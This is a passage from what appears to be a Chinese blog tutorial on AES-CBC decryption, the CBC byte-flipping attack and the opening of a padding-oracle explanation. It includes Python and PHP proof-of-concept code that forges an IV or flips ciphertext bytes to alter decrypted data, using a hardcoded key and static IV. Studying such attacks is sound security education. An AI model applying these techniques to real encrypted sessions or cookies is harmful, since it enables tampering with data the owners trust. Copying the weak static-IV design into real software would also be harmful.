+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>首先按照一定长度将密文分好组，其中密文的第一组是初始的IV值，第二组密文对应第一组明文。</span><br><span class="line"><span class="number">2.</span>分好组后，从第二组密文开始依次用算法进行解密运算得到n组中间值，这时候得到的值并不是明文，要想得到明文还需进行一次异或操</span><br><span class="line">作，第一个中间值与初始IV值异或得到明文，第二个中间值与前一组的密文异或得到第二组明文，以此类推最后一组中间值与倒数第二组密</span><br><span class="line">文进行亦或便可得到最后一组明文，将所有的明文连在一起便是最终的明文。</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-CBC字节翻转攻击"><a href="#0x05-CBC字节翻转攻击" class="headerlink" title="0x05 CBC字节翻转攻击"></a>0x05 CBC字节翻转攻击</h2><h3 id="5-1-攻击原理"><a href="#5-1-攻击原理" class="headerlink" title="5.1 攻击原理"></a>5.1 攻击原理</h3><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200622122828477.png" alt="image-20200622122828477"></p>
+<p>以第一个分组为例：<br><strong>加密过程：</strong></p>
+<p><strong>将原明文称为sourceStr，</strong></p>
+<p><strong>初始IV称为old_IV,</strong></p>
+<p><strong>sourceStr^old_IV得到中间值middlecipher。</strong></p>
+<p><strong>middlecipher经过分组加密算法(aes,des)得到第一组密文。</strong></p>
+<p><strong>解密过程：</strong></p>
+<p><strong>第一组密文经分组解密算法得到中间值middlecipher，</strong></p>
+<p><strong>middlecipher^old_IV得到原明文sourceStr。</strong></p>
+<p>同理正常解密过程 <code>sourceStr=middlecipher^old_IV</code></p>
+<p>我们希望通过提交构造的&#96;&#96;evil_IV <code>得到我们想要的解密明文</code>targeStr&#96;，</p>
+<p>也就是 <code>targeStr=middlecipher^evil_IV</code></p>
+<p>而得到evil_IV的方式为:<code>evil_IV=middlecipher^targeStr</code></p>
+<p>但是需要知道&#96;&#96;middlecipher&#96;</p>
+<p>由上面可知中心为&#96;&#96;middlecipher&#96;，</p>
+<p>只要得到了 <code>middlecipher</code>就可以构造出 <code>evil_IV</code>。</p>
+<p>因为 <code>sourceStr=middlecipher^old_IV</code></p>
+<p>所以知道了明文 <code>sourceStr</code>和 <code>old_IV</code>就能异或出 <code>middlecipher</code>。</p>
+<p>即 <code>evil_IV=old_IV^sourceStr^targetStr</code></p>
+<h3 id="5-2-POC"><a href="#5-2-POC" class="headerlink" title="5.2 POC"></a>5.2 POC</h3><blockquote>
+<p>这是在知道明文和IV的情况下并可以提交我们构造的IV的情况下,我们可改变第一个明文分组的值</p>
+</blockquote>
+<p><strong>已知明文sourceStr和old_IV可以构造Evil-IV来改变明文为目标明文targetStr（这里只能改变第一个分组）。</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line">SECRET_KEY=codecs.encode(os.urandom(<span class="number">8</span>),<span class="string">&#x27;hex_codec&#x27;</span>).upper() <span class="comment">#16byte密钥</span></span><br><span class="line">IV=Random.new().read(<span class="number">16</span>)    <span class="comment">#16byte初始向量</span></span><br><span class="line"></span><br><span class="line">sourceStr=<span class="string">&#x27;hello,world&#x27;</span></span><br><span class="line">aes = AES.new(SECRET_KEY,AES.MODE_CBC,IV)</span><br><span class="line">length = <span class="number">16</span></span><br><span class="line">count = <span class="built_in">len</span>(sourceStr)</span><br><span class="line">add = length - (count % length)</span><br><span class="line">sourceStr = sourceStr + (<span class="built_in">chr</span>(<span class="number">0</span>) * add) <span class="comment">#正常情况下这里应该是补\x05 5由16-11得来，但由于我省事不想处理结果后面出现的乱码，就省事改为\x00了</span></span><br><span class="line">cipher=aes.encrypt(sourceStr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;明文为:&quot;</span>,sourceStr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;秘钥为:&quot;</span>,SECRET_KEY)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;IV为：&quot;</span>,IV)</span><br><span class="line"><span class="comment"># print(&quot;明文序列为:&quot;,list(sourceStr))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;密文为:&quot;</span>,aes.encrypt(sourceStr))</span><br><span class="line"></span><br><span class="line">old_IVList=[]</span><br><span class="line">sourceStrList=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(codecs.encode(IV,<span class="string">&#x27;hex_codec&#x27;</span>).decode()),<span class="number">2</span>):</span><br><span class="line">    old_IVList.append(<span class="built_in">int</span>(codecs.encode(IV,<span class="string">&#x27;hex_codec&#x27;</span>).decode()[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">evil_IVList=old_IVList</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(sourceStr):</span><br><span class="line">    sourceStrList.append(<span class="built_in">ord</span>(i))</span><br><span class="line"></span><br><span class="line">evil_IVList[<span class="number">9</span>]=sourceStrList[<span class="number">9</span>]^old_IVList[<span class="number">9</span>]^<span class="number">0</span>  <span class="comment">#让第10位消失</span></span><br><span class="line">evil_IVList[<span class="number">10</span>]=sourceStrList[<span class="number">10</span>]^old_IVList[<span class="number">10</span>]^<span class="built_in">ord</span>(<span class="string">&#x27;D&#x27;</span>)  <span class="comment">#让解出来的明文第11位为D</span></span><br><span class="line">evil_IVList[<span class="number">11</span>]=sourceStrList[<span class="number">11</span>]^old_IVList[<span class="number">11</span>]^<span class="built_in">ord</span>(<span class="string">&#x27;!&#x27;</span>)  <span class="comment">#再加个!</span></span><br><span class="line">evil_IV=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> evil_IVList:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">hex</span>(i)[<span class="number">2</span>:])==<span class="number">1</span>:  <span class="comment">#为了保证构造出来的IV是16byte,1位的16进制补0变成2位</span></span><br><span class="line">        evil_IV+=<span class="string">&#x27;0&#x27;</span>+<span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        evil_IV += <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">evil_IV=codecs.decode(evil_IV,<span class="string">&#x27;hex_codec&#x27;</span>)  <span class="comment">#恶意构造的16byte IV</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;恶意构造出的IV:&quot;</span>,evil_IV)</span><br><span class="line">aes = AES.new(SECRET_KEY,AES.MODE_CBC,evil_IV)</span><br><span class="line">dsc=aes.decrypt(cipher).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;利用恶意构造的IV结出来的明文:&quot;</span>,dsc)</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200629095331371.png" alt="image-20200629095331371"></p>
+<h3 id="5-3-一个例子"><a href="#5-3-一个例子" class="headerlink" title="5.3 一个例子"></a>5.3 一个例子</h3><p>比方说，我们有这样的明文序列：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="punctuation">:</span><span class="number">2</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>s<span class="punctuation">:</span><span class="number">4</span><span class="punctuation">:</span><span class="string">&quot;name&quot;</span>;s<span class="punctuation">:</span><span class="number">6</span><span class="punctuation">:</span><span class="string">&quot;sdsdsd&quot;</span>;s<span class="punctuation">:</span><span class="number">8</span><span class="punctuation">:</span><span class="string">&quot;greeting&quot;</span>;s<span class="punctuation">:</span><span class="number">20</span><span class="punctuation">:</span><span class="string">&quot;echo &#x27;Hello sdsdsd!&#x27;&quot;</span>;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们的目标是将“<code>s:6</code>”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成&#96;&#96;16&#96;个字节的块：</p>
+<ul>
+<li>Block 1:<code>a:2:&#123;s:4:&quot;name&quot;;</code></li>
+<li>Block 2:<code>s:6:&quot;sdsdsd&quot;;s:8</code></li>
+<li>Block 3:<code>:&quot;greeting&quot;;s:20</code></li>
+<li>Block 4:<code>:&quot;echo &#39;Hello sd</code></li>
+<li>Block 5:<code>sdsd!&#39;&quot;;&#125;</code></li>
+</ul>
+<p>因此，我们的目标字符位于块2，这意味着我们需要改变块1的密文来改变第二块的明文。</p>
+<p>有一条经验法则是：</p>
+<blockquote>
+<p>你在密文中改变的字节，<strong>只</strong>会影响到在下一明文当中，具有相同偏移量的字节。</p>
+</blockquote>
+<p>所以我们目标的偏移量是2：</p>
+<ul>
+<li>[0] &#x3D; s</li>
+<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/wp-content/uploads/2015/08/115.png">1</a> &#x3D; :</li>
+<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/wp-content/uploads/2015/08/216.png">2</a> &#x3D;6</li>
+</ul>
+<p>因此我们要改变在第一个密文块当中，偏移量是2的字节。正如你在下面的代码当中看到的，在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。</p>
+<ol>
+<li><code>$v = &quot;a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &#39;Hello sdsdsd!&#39;&quot;;&#125;&quot;;</code></li>
+<li><code>$enc = @encrypt($v);</code></li>
+<li><code>$enc[2] = chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));</code></li>
+<li><code>$b = @decrypt($enc);</code></li>
+</ol>
+<p>运行这段代码后，我们可以将数字6变为7：</p>
+<p>但是我们在第3行中，是如何改变字节成为我们想要的值呢？</p>
+<p>基于上述的解密过程，我们知道有，<em>A &#x3D; Decrypt(Ciphertext)<em>与</em>B &#x3D; Ciphertext-N-1</em>异或后最终得到<em>C &#x3D; 6</em>。等价于：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C = A XOR B</span><br></pre></td></tr></table></figure>
+
+<p>所以，我们唯一不知道的值就是A（注：对于B，C来说）（<em>block cipher decryption</em>）;借由XOR，我们可以很轻易地得到A的值：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A = B XOR C</span><br></pre></td></tr></table></figure>
+
+<p>最后，A XOR B XOR C等于0。</p>
+<p>有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，就像这样：</p>
+<p><code>A XOR B XOR C XOR &quot;7&quot;</code>会在块2的明文当中，偏移量为2的字节处得到7。</p>
+<p>下面是相关原理实现的PHP源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MY_AES_KEY&#x27;</span>, <span class="string">&quot;abcdef0123456789&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$encrypt</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$aes</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128, <span class="string">&#x27;&#x27;</span>, MCRYPT_MODE_CBC, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="string">&quot;1234567891234567&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$aes</span>, MY_AES_KEY, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encrypt</span> ? <span class="title function_ invoke__">mcrypt_generic</span>(<span class="variable">$aes</span>,<span class="variable">$data</span>) : <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$aes</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MY_MAC_LEN&#x27;</span>, <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">aes</span>(<span class="variable">$data</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">aes</span>(<span class="variable">$data</span>, <span class="literal">false</span>), <span class="string">&quot;\0&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$v</span> = <span class="string">&quot;a:2:&#123;s:4:\&quot;name\&quot;;s:6:\&quot;sdsdsd\&quot;;s:8:\&quot;greeting\&quot;;s:20:\&quot;echo &#x27;Hello sdsdsd!&#x27;\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Plaintext before attack: <span class="subst">$v</span>\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$enc</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$enc</span> = @<span class="title function_ invoke__">encrypt</span>(<span class="variable">$v</span>);</span><br><span class="line"><span class="variable">$enc</span>[<span class="number">2</span>] =  <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$enc</span>[<span class="number">2</span>]) ^ <span class="title function_ invoke__">ord</span>(<span class="string">&quot;6&quot;</span>) ^ <span class="title function_ invoke__">ord</span> (<span class="string">&quot;7&quot;</span>));</span><br><span class="line"><span class="variable">$b</span> = @<span class="title function_ invoke__">decrypt</span>(<span class="variable">$enc</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Plaintext AFTER attack : <span class="subst">$b</span>\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-padding-oracle攻击原理"><a href="#0x06-padding-oracle攻击原理" class="headerlink" title="0x06 padding oracle攻击原理"></a>0x06 padding oracle攻击原理</h2><h3 id="6-1-概要"><a href="#6-1-概要" class="headerlink" title="6.1 概要"></a>6.1 概要</h3><p>padding oracle是用来获取明文source_Str的，</p>
+<p>但更准确的说应该是获取中间值middlecipher的。</p>
+<p>获取了中间值之后，如果我们知道了初始IV和密文cipher后，</p>
+<p>就可以得到明文sourceStr（<code>sourceStr=middlecipher^old_IV</code>）</p>
+<p>然后我们就可以进行CBC字节翻转攻击</p>
+<h3 id="6-2-详解"><a href="#6-2-详解" class="headerlink" title="6.2 详解"></a>6.2 详解</h3><p>CBC加密模式要对明文进行分组(通常为8或16字节，取决于算法，比如AES-128-CBC就是16字节,128bit&#x3D;16byte),CBC分组遵循PKCS#5标准，填充的字符为余下字节的个数。用8byte分组做例子的话，如下图，需注意即便分组内容能正好平均分为n组，仍需要在最后一组后面填充一个八位分组，</p>
+<p>CBC加密模式要对明文进行分组(通常为8或16字节，取决于算法，比如AES-128-CBC就是16字节,128bit&#x3D;16byte),CBC分组遵循PKCS#5标准，填充的字符为余下字节的个数。用8byte分组做例子的话，如下图，需注意即便分组内容能正好平均分为n组，仍需要在最后一组后面填充一个八位分组，<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" 